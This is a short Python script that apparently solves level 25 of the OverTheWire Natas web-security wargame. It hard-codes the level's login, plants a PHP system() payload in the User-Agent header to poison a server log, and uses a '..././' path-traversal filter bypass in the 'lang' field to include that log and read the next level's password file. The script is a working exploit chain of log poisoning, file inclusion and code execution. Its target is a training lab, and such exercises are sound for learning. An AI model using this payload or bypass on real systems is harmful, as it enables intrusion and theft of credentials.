#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas25'
password = 'O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

headers = {"User-Agent" : "<?php system( 'cat /etc/natas_webpass/natas26' ); ?>"}

response = session.get(url, auth=(username, password))
print(session.cookies['PHPSESSID'])
response = session.post(url, headers = headers, data = {"lang" : "..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + session.cookies['PHPSESSID'] + ".log"}, auth=(username, password))


content = response.text
print(content)